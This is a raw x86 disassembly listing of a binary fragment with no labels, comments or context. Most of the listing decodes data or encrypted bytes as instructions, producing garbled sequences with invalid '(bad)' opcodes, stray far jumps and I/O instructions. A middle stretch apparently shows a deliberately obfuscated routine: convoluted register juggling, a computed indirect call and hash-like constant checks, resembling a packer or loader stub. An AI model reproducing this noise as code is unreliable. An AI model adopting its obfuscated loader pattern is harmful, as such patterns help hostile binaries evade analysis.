  40cd0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd0f:	xor    bl,al
  40cd11:	pop    esi
  40cd12:	int3   
  40cd13:	inc    ebx
  40cd14:	cli    
  40cd15:	arpl   ax,sp
  40cd17:	jbe    0x40cd7a
  40cd19:	dec    esi
  40cd1a:	aam    0xa1
  40cd1c:	add    eax,0xd4a95d9f
  40cd21:	ss test cl,bh
  40cd24:	test   BYTE PTR ds:0x701da501,bl
  40cd2a:	cmp    dl,BYTE PTR [ecx-0x5308d45e]
  40cd30:	mov    DWORD PTR [ecx+edx*4],0x4aee99c1
  40cd37:	(bad)  
  40cd38:	pop    ebx
  40cd39:	xchg   esi,eax
  40cd3a:	pop    esp
  40cd3b:	scas   al,BYTE PTR es:[edi]
  40cd3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3d:	dec    edx
  40cd3e:	dec    edx
  40cd3f:	ret    
  40cd40:	iret   
  40cd41:	aaa    
  40cd42:	ds jle 0x40cd9b
  40cd45:	push   0xffffffbc
  40cd47:	in     al,dx
  40cd48:	fisub  DWORD PTR [edx+0x6d]
  40cd4b:	repz retf 0xddc2
  40cd4f:	or     BYTE PTR [edi+0x12],bh
  40cd52:	aaa    
  40cd53:	stos   BYTE PTR es:[edi],al
  40cd54:	popf   
  40cd55:	dec    ebp
  40cd56:	sbb    BYTE PTR [ebp-0x61],dl
  40cd59:	fsub   QWORD PTR [ebx-0x31]
  40cd5c:	mov    al,0xbb
  40cd5f:	test   edx,ebx
  40cd61:	push   edi
  40cd62:	jecxz  0x40cd85
  40cd64:	mov    al,ds:0x98b580b2
  40cd69:	fs dec eax
  40cd6b:	fld    TBYTE PTR [esi+0x6265b85a]
  40cd71:	pop    eax
  40cd72:	mov    bh,0xf4
  40cd74:	push   esp
  40cd75:	mov    eax,0x6a787977
  40cd7a:	inc    ebx
  40cd7b:	jo     0x40cdd3
  40cd7d:	sahf   
  40cd7e:	mov    ds:0xf833a8b6,al
  40cd83:	lea    eax,[ebx+0x281aea90]
  40cd89:	pop    edx
  40cd8a:	sub    eax,esi
  40cd8c:	add    BYTE PTR ds:0xb64a8735,0xf3
  40cd93:	in     al,0xf8
  40cd95:	jmp    0x7b88ba85
  40cd9a:	fs pop esp
  40cd9c:	shr    BYTE PTR [ebx-0x2c2aea1f],1
  40cda2:	cmp    ecx,DWORD PTR [eax-0xa]
  40cda5:	or     eax,0x6b08c89f
  40cdaa:	mov    bl,0x11
  40cdac:	adc    BYTE PTR [eax],cl
  40cdae:	(bad)  
  40cdaf:	ja     0x40ce0a
  40cdb1:	xor    al,0x13
  40cdb3:	jl     0x40cd78
  40cdb5:	pop    esp
  40cdb6:	std    
  40cdb7:	stos   BYTE PTR es:[edi],al
  40cdb8:	mov    bl,0xe3
  40cdba:	sbb    eax,0x81b61896
  40cdbf:	psllw  mm2,QWORD PTR [ebx-0x3e]
  40cdc3:	iret   
  40cdc4:	inc    edx
  40cdc5:	sub    DWORD PTR [ebp+0x71f6d7cd],ebp
  40cdcb:	aaa    
  40cdcc:	pop    ebp
  40cdcd:	jnp    0x40ce3d
  40cdcf:	shr    BYTE PTR [esi],cl
  40cdd1:	int    0x57
  40cdd3:	arpl   cx,cx
  40cdd5:	xlat   BYTE PTR ds:[ebx]
  40cdd6:	leave  
  40cdd7:	jle    0x40ce19
  40cdd9:	push   0x47
  40cddb:	les    esi,FWORD PTR [esi+0x4c]
  40cdde:	je     0x40cdad
  40cde0:	mov    ds:0x8260fa92,al
  40cde5:	out    dx,eax
  40cde6:	or     BYTE PTR [eax+0x71],cl
  40cde9:	pop    esi
  40cdea:	and    DWORD PTR [ecx-0x23],edx
  40cded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdee:	mov    dh,BYTE PTR [ebx]
  40cdf0:	mov    dh,0xed
  40cdf2:	push   cs
  40cdf3:	imul   eax,DWORD PTR [esi+0x45],0xffffff8d
  40cdf7:	inc    ebx
  40cdf8:	mov    dh,0x56
  40cdfa:	sbb    al,0x15
  40cdfc:	out    0xe8,al
  40cdfe:	dec    ebx
  40cdff:	sub    DWORD PTR [ebx],0x49
  40ce02:	mov    dl,0xe9
  40ce04:	dec    DWORD PTR [edx-0x67]
  40ce07:	enter  0x52c7,0x69
  40ce0b:	sub    DWORD PTR ds:0x31448e91,ecx
  40ce11:	jl     0x40cdba
  40ce13:	int3   
  40ce14:	jge    0x40cdec
  40ce16:	aas    
  40ce17:	push   ecx
  40ce18:	jg     0x40cdd7
  40ce1a:	bound  ebp,QWORD PTR [ebx-0x33]
  40ce1d:	and    ebp,DWORD PTR [esi]
  40ce1f:	dec    esi
  40ce20:	lods   eax,DWORD PTR ds:[esi]
  40ce21:	sahf   
  40ce22:	les    edi,FWORD PTR [edi+0x56]
  40ce25:	sti    
  40ce26:	mov    ecx,DWORD PTR [edi-0x50997fd5]
  40ce2c:	or     DWORD PTR [edi-0x2b9a9688],edx
  40ce32:	repnz xadd DWORD PTR [edx+0x7130ce03],esp
  40ce3a:	add    al,bh
  40ce3c:	xor    DWORD PTR [ecx],esp
  40ce3e:	pop    ss
  40ce3f:	leave  
  40ce40:	std    
  40ce41:	neg    BYTE PTR [ebx+0x78]
  40ce44:	in     al,dx
  40ce45:	push   edx
  40ce46:	pop    es
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c26
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x4238aa
  40cf91:	push   0x423862
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a46
  40cff7:	mov    ebx,DWORD PTR ds:0x421a6e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c26
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421caa
  40d0ed:	mov    esi,DWORD PTR ds:0x421ca2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ca2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	in     eax,0x7
  40d113:	out    0x7b,eax
  40d115:	ret    0x62d1
  40d118:	(bad)  
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x6]
  40d11e:	xor    bh,BYTE PTR [ecx-0x2b12df92]
  40d124:	dec    edx
  40d125:	repnz sub ch,bh
  40d128:	push   es
  40d129:	ins    BYTE PTR es:[edi],dx
  40d12a:	dec    esp
  40d12b:	cmp    ebp,DWORD PTR [ebp+0x4b9fb219]
  40d131:	push   0xffffff95
  40d133:	cs scas eax,DWORD PTR es:[edi]
  40d135:	ins    BYTE PTR es:[edi],dx
  40d136:	cmp    eax,DWORD PTR [edx+0x3b]
  40d139:	sar    DWORD PTR [esi-0x72],cl
  40d13c:	mov    ebp,0x67c1cde1
  40d141:	sub    ebp,DWORD PTR [ecx]
  40d143:	inc    esi
  40d144:	or     edx,esp
  40d146:	push   edx
  40d147:	jmp    0xe1319702
  40d14c:	mov    ah,0xc0
  40d14e:	addr16 inc esp
  40d150:	call   0xaa53a07f
  40d155:	adc    al,0x27
  40d157:	inc    ebp
  40d158:	sub    BYTE PTR [ecx+ebx*4],ch
  40d15b:	sub    DWORD PTR [ecx],edx
  40d15d:	ds dec esi
  40d15f:	test   al,0xf0
  40d161:	pop    eax
  40d162:	cld    
  40d163:	gs pop eax
  40d165:	xchg   edx,eax
  40d166:	jno    0x40d0fa
  40d168:	shr    BYTE PTR [ebx+0x33dcd2e9],cl
  40d16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16f:	sub    ch,BYTE PTR [edi+0x3049b153]
  40d175:	ror    BYTE PTR [eax-0x38ef43ea],1
  40d17b:	jmp    0x1a12:0x5612ba27
  40d182:	xchg   esi,edi
  40d184:	pop    edx
  40d185:	ficomp DWORD PTR [eax+0x14]
  40d188:	mov    ah,0x7e
  40d18a:	push   cs
  40d18b:	test   esp,esp
  40d18d:	mov    ?,WORD PTR [edi]
  40d18f:	das    
  40d190:	fdivr  DWORD PTR [ebp+0x41]
  40d193:	gs montmul (bad)
  40d195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d196:	cmp    DWORD PTR [ebp+0x11],0xffffff87
  40d19a:	jecxz  0x40d1fa
  40d19c:	test   dh,ch
  40d19e:	dec    esp
  40d19f:	sti    
  40d1a0:	mov    cl,0x33
  40d1a2:	cld    
  40d1a3:	int3   
  40d1a4:	nop
  40d1a5:	or     bl,BYTE PTR [edi-0x64c1f6d5]
  40d1ab:	out    0x1e,al
  40d1ad:	ret    
  40d1ae:	inc    ebp
  40d1af:	jecxz  0x40d1b6
  40d1b1:	ret    
  40d1b2:	mov    edi,0xeffaebfc
  40d1b7:	mov    al,0xb5
  40d1b9:	rcl    esi,1
  40d1bb:	int    0x58
  40d1bd:	mov    ds,ebx
  40d1bf:	mov    BYTE PTR [ecx+eax*4-0x4f07f6de],dl
  40d1c6:	rcl    BYTE PTR [eax],0xc5
  40d1c9:	sub    BYTE PTR [ebx+0x6f],dl
  40d1cc:	inc    esp
  40d1cd:	outs   dx,BYTE PTR ds:[esi]
  40d1ce:	ss enter 0xc969,0x63
  40d1d3:	idiv   DWORD PTR [esi]
  40d1d5:	call   0xd429c1c5
  40d1da:	cmp    eax,0x58ebe612
  40d1df:	dec    ebp
  40d1e0:	and    dl,al
  40d1e2:	sub    al,0x9a
  40d1e4:	adc    BYTE PTR [ebp+eax*8+0x74603f6d],bh
  40d1eb:	rol    eax,1
  40d1ed:	popf   
  40d1ee:	mov    esi,0x3f343bbf
  40d1f3:	add    BYTE PTR [ecx+0x47dad68],al
  40d1f9:	enter  0x8dfb,0xdd
  40d1fd:	mov    ah,0xee
  40d1ff:	and    bl,BYTE PTR [edx+0x3]
  40d202:	mov    BYTE PTR [edi+edx*4],cl
  40d205:	or     ebx,DWORD PTR fs:[esi+0xef61f2c]
  40d20c:	xchg   edi,eax
  40d20d:	mov    dl,0x70
  40d20f:	retf   0xc90a
  40d212:	mov    ds:0xe69c7481,al
  40d217:	jge    0x40d293
  40d219:	(bad)  
  40d21a:	fcmovne st,st(4)
  40d21c:	cwde   
  40d21d:	test   eax,ebx
  40d21f:	repz cwde 
  40d221:	xchg   esp,eax
  40d222:	ficom  DWORD PTR [edx+ebx*4-0x52]
  40d226:	dec    esp
  40d227:	jns    0x40d2a2
  40d229:	xor    bh,dl
  40d22b:	push   0xfb8f6c8a
  40d230:	cmp    al,0xc3
  40d232:	add    eax,0x27a449e6
  40d237:	inc    edi
  40d238:	cdq    
  40d239:	mov    ds:0xf97f526c,al
  40d23e:	push   ss
  40d23f:	mov    BYTE PTR [ecx-0x3f],ah
  40d242:	xor    BYTE PTR [edx+0x30f2319d],ch
  40d248:	mov    ah,0xb
  40d24a:	fisttp DWORD PTR [ebp-0x50e88b10]
  40d250:	pop    ebx
  40d251:	sbb    DWORD PTR [edx+0x3f7b257],esi
  40d257:	lods   eax,DWORD PTR ds:[esi]
  40d258:	das    
  40d259:	xchg   esp,eax
  40d25a:	mov    ah,0x3c
  40d25c:	xchg   ebx,eax
  40d25d:	es hlt 
  40d25f:	out    0x40,al
  40d261:	adc    bl,al
  40d263:	aas    
  40d264:	aaa    
  40d265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d267:	loope  0x40d250
  40d269:	ins    DWORD PTR es:[edi],dx
  40d26a:	jae    0x40d1f4
  40d26c:	xchg   esi,eax
  40d26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d26e:	into   
  40d26f:	(bad)  
  40d271:	in     al,0x66
  40d273:	(bad)  
  40d274:	ret    0x5278
  40d277:	repz lahf 
  40d279:	xor    edi,0x4
  40d27c:	and    BYTE PTR [edi+ecx*1-0x56470222],0x78
  40d284:	mov    edi,0x99e59dff
  40d289:	stos   DWORD PTR es:[edi],eax
  40d28a:	dec    esi
  40d28b:	imul   ebx,ebx,0xffffffe8
  40d28e:	sub    BYTE PTR [ecx-0x75370177],dl
  40d294:	sub    al,0x60
  40d296:	inc    ecx
  40d297:	stc    
  40d298:	xor    ah,BYTE PTR [ebx+0x1]
  40d29b:	(bad)  
  40d29c:	ficomp DWORD PTR [eax-0x51]
  40d29f:	bound  edi,QWORD PTR [edi]
  40d2a1:	or     eax,0x91cc79a6
  40d2a6:	sub    BYTE PTR [ebp-0x7],0xbc
  40d2aa:	je     0x40d27f
  40d2ac:	mov    bh,0xa3
  40d2ae:	xor    esi,esp
  40d2b0:	or     ch,ch
  40d2b2:	push   eax
  40d2b3:	or     ch,BYTE PTR [edx+0x60]
  40d2b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2b7:	gs pop edi
  40d2b9:	mov    ah,0xf2
  40d2bb:	xor    dh,al
  40d2bd:	fsub   DWORD PTR [edi-0x36]
  40d2c0:	push   cs
  40d2c1:	pop    ebx
  40d2c2:	xchg   ebp,eax
  40d2c3:	leave  
  40d2c4:	and    edi,ebp
  40d2c6:	adc    ebp,DWORD PTR [ecx-0x64260db0]
  40d2cc:	imul   esp,DWORD PTR [ebp+0x10],0xa17ceb9f
  40d2d3:	lock mov edi,0xd40e6b34
  40d2d9:	ret    0xcf2c
  40d2dc:	mov    DWORD PTR [eax-0x43fb3af6],0x8e6933bf
  40d2e6:	ins    DWORD PTR es:[edi],dx
  40d2e7:	jg     0x40d2dd
  40d2e9:	clc    
  40d2ea:	in     eax,dx
  40d2eb:	fs push eax
  40d2ed:	sti    
  40d2ee:	jmp    0x40d2ee
  40d2f0:	xchg   ebp,eax
  40d2f1:	sbb    ch,dh
  40d2f3:	sbb    BYTE PTR [eax+edi*4+0x7c6c4160],bl
  40d2fa:	mov    esi,0xe520b8e4
  40d2ff:	test   eax,0x20087506
  40d304:	xchg   eax,ebx
  40d306:	rol    DWORD PTR [eax-0x7a],0xdc
  40d30a:	pop    es
  40d30b:	sti    
  40d30c:	pop    eax
  40d30d:	cld    
  40d30e:	mov    cl,ah
  40d310:	fcom   DWORD PTR [ebx-0x72]
  40d313:	lods   al,BYTE PTR ds:[esi]
  40d314:	adc    ah,BYTE PTR [ebp-0x23730fe7]
  40d31a:	ds out 0xfd,al
  40d31d:	mov    al,0x68
  40d31f:	lock ficom DWORD PTR [ebp+0x4561473e]
  40d326:	mov    esp,DWORD PTR [esi+edx*1-0x3]
  40d32a:	sbb    bh,dh
  40d32c:	mov    esi,0x451cea4f
  40d331:	and    DWORD PTR [eax+0xc],eax
  40d334:	jno    0x40d37d
  40d336:	sahf   
  40d337:	push   0xdbaf0970
  40d33c:	mov    DWORD PTR [ebx+0x5c],eax
  40d33f:	add    ecx,DWORD PTR [ebx]
  40d341:	int    0x99
  40d343:	push   ebp
  40d345:	dec    edi
  40d346:	into   
  40d347:	cmp    ebp,DWORD PTR [esi+0x1f]
  40d34a:	ins    BYTE PTR es:[edi],dx
  40d34b:	fcomp  QWORD PTR [edi]
  40d34d:	jns    0x40d2ef
  40d34f:	jl     0x40d31e
  40d351:	and    al,0x9f
  40d353:	call   0xed4a:0xc0ba375e
  40d35a:	mov    ds:0xa4bf0af8,eax
  40d35f:	sbb    DWORD PTR [eax+0x33],ecx
  40d362:	xor    eax,0x9304105b
  40d367:	sar    DWORD PTR [ebp-0x5d0e4bf8],1
  40d36d:	xchg   DWORD PTR [ecx+0x25],esi
  40d370:	daa    
  40d371:	jb     0x40d313
  40d373:	inc    eax
  40d374:	and    ah,BYTE PTR cs:[ecx-0x512563c4]
  40d37b:	mov    ds:0xb73cd1bf,eax
  40d380:	stos   DWORD PTR es:[edi],eax
  40d381:	fsub   DWORD PTR [eax+0x5d]
  40d384:	outs   dx,DWORD PTR ds:[esi]
  40d385:	xor    bl,BYTE PTR [ecx]
  40d387:	mov    ebx,0xf2a56e32
  40d38c:	or     al,0xe3
  40d38e:	and    ebx,0x78
  40d391:	dec    esi
  40d392:	adc    DWORD PTR [edx-0x17],edi
  40d395:	frstor [edi+0x3cb9967d]
  40d39b:	es loope 0x40d40d
  40d39e:	adc    al,0x3c
  40d3a1:	out    dx,al
  40d3a2:	sbb    cl,BYTE PTR [eax+0x26]
  40d3a5:	jmp    0xb62b:0x596b6e7f
  40d3ac:	jmp    0xaf22:0xea463331
  40d3b3:	mov    cl,0xe0
  40d3b5:	dec    eax
  40d3b6:	mov    al,0xc1
  40d3b8:	adc    BYTE PTR [edi],bh
  40d3ba:	adc    al,0xde
  40d3bc:	in     eax,dx
  40d3bd:	inc    ecx
  40d3be:	inc    eax
  40d3bf:	test   al,0xe7
  40d3c1:	pop    edi
  40d3c2:	or     eax,0x5cb93544
  40d3c7:	call   0xfb1c:0x686ab792
  40d3ce:	xor    edx,edx
  40d3d0:	jo     0x40d42e
  40d3d2:	or     al,0x24
  40d3d4:	add    al,0xcb
  40d3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3d7:	cmp    BYTE PTR [edx+0x15],ch
  40d3da:	sub    al,0x44
  40d3dc:	or     ebp,DWORD PTR [ebx]
  40d3de:	int    0x97
  40d3e0:	and    eax,0xb91cdaf
  40d3e5:	mov    esp,ebx
  40d3e7:	test   eax,0xf27f9fe1
  40d3ec:	inc    ecx
  40d3ed:	cmp    al,0x9a
  40d3ef:	xor    eax,0xee318b5c
  40d3f4:	ret    0xbeb6
  40d3f7:	lds    ebx,FWORD PTR [ecx+0x1e202aee]
  40d3fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3fe:	les    edi,FWORD PTR [edx+eiz*1]
  40d401:	ds dec eax
  40d403:	hlt    
  40d404:	push   es
  40d405:	lock add edi,edx
  40d408:	jnp    0x40d405
  40d40a:	mov    WORD PTR [edi-0x5e],ds
  40d40d:	loopne 0x40d447
  40d40f:	fild   QWORD PTR [ebp+0x57]
  40d412:	push   ebp
  40d413:	fsubr  DWORD PTR ds:0xa5990f16
  40d419:	mov    eax,ds:0xcbcc07d0
  40d41e:	dec    esp
  40d41f:	das    
  40d420:	ret    
  40d421:	jmp    0xe4b803b
  40d426:	in     al,0x80
  40d428:	dec    edi
  40d429:	jns    0x40d469
  40d42b:	dec    ebx
  40d42c:	cld    
  40d42d:	shl    dh,1
  40d42f:	jl     0x40d41a
  40d431:	mov    dl,0x1e
  40d433:	mov    dl,0x4d
  40d435:	cmp    edi,DWORD PTR [edx]
  40d437:	jmp    0xbc65:0x83cee8a8
  40d43e:	pop    ss
  40d43f:	mov    ebx,0x3b4a5b10
  40d444:	retf   0x4085
  40d447:	jne    0x40d4c4
  40d449:	cld    
  40d44a:	mov    al,BYTE PTR [edx]
  40d44c:	hlt    
  40d44d:	clc    
  40d44e:	shr    BYTE PTR [esi+0x1f05589f],cl
  40d454:	inc    ecx
  40d455:	sbb    DWORD PTR [ebx],ebx
  40d457:	adc    bh,bl
  40d459:	cmp    eax,0x139c2066
  40d45e:	cs ss scas al,BYTE PTR es:[edi]
  40d461:	cmc    
  40d462:	xor    al,0xcc
  40d464:	and    eax,0x255ec88a
  40d469:	xor    dh,BYTE PTR ds:0xc8c52d68
  40d46f:	sbb    BYTE PTR [edi+0x4],ch
  40d472:	mov    eax,ds:0x61f226b0
  40d477:	xor    eax,0xa665698d
  40d47c:	sbb    al,0x3a
  40d47e:	and    eax,0xa7845e27
  40d483:	mov    DWORD PTR [edi+0xa],esi
  40d486:	xchg   esp,eax
  40d487:	pop    edx
  40d488:	pushf  
  40d489:	mov    edx,0x7c9e26c0
  40d48e:	aaa    
  40d48f:	movmskps esp,xmm3
  40d492:	fistp  WORD PTR [edi-0x12]
  40d495:	mov    al,0x4c
  40d497:	jle    0x40d432
  40d499:	js     0x40d4d1
  40d49b:	outs   dx,BYTE PTR ds:[esi]
  40d49c:	in     al,dx
  40d49d:	aas    
  40d49e:	dec    eax
  40d49f:	lods   eax,DWORD PTR ds:[esi]
  40d4a0:	adc    al,0xbd
  40d4a2:	call   0x6d2f:0x7da75413
  40d4a9:	(bad)  
  40d4aa:	push   ebx
  40d4ab:	ja     0x40d522
  40d4ad:	fwait
  40d4ae:	inc    esp
  40d4af:	fsubrp st(1),st
  40d4b1:	out    0x21,eax
  40d4b3:	push   ebx
  40d4b4:	lods   al,BYTE PTR ds:[esi]
  40d4b6:	out    dx,eax
  40d4b7:	xchg   BYTE PTR [ecx+0x5c9a00da],dh
  40d4bd:	jnp    0x40d4be
  40d4bf:	push   esp
  40d4c0:	adc    DWORD PTR [ecx],edi
  40d4c2:	mov    edx,0xc6e5be0d
  40d4c7:	lods   al,BYTE PTR ds:[esi]
  40d4c8:	sub    eax,0x46e91f79
  40d4cd:	mov    ds:0x3689c4c3,eax
  40d4d2:	ins    BYTE PTR es:[edi],dx
  40d4d3:	shr    esi,0xe4
  40d4d6:	std    
  40d4d7:	push   cs
  40d4d8:	xor    ebp,0x12
  40d4db:	push   ds
  40d4dc:	inc    edi
  40d4dd:	sub    al,BYTE PTR [edi-0x6f]
  40d4e0:	(bad)  
  40d4e1:	jb     0x40d499
  40d4e3:	pop    esp
  40d4e4:	out    dx,al
  40d4e5:	inc    esp
  40d4e6:	in     al,dx
  40d4e7:	popf   
  40d4e8:	mov    ds:0x341d2d90,eax
  40d4ed:	rcr    BYTE PTR [ecx],1
  40d4ef:	scas   eax,DWORD PTR es:[edi]
  40d4f0:	push   eax
  40d4f1:	retf   
  40d4f2:	jmp    0x4bb2b8bf
  40d4f7:	int    0xc4
  40d4f9:	jmp    0xba0b2410
  40d4fe:	and    eax,0x24d7541c
  40d503:	(bad)  
  40d504:	jp     0x40d4bb
  40d506:	psubusw mm3,QWORD PTR [edi+eiz*2+0x686d3c4e]
  40d50e:	sar    DWORD PTR [ebx+0x7d],0x6e
  40d512:	aaa    
  40d513:	test   eax,0x5b76dbef
  40d518:	add    edx,DWORD PTR [eax]
  40d51a:	sub    BYTE PTR ds:0x4df6d46d,bh
  40d520:	(bad)  
  40d521:	pop    ebp
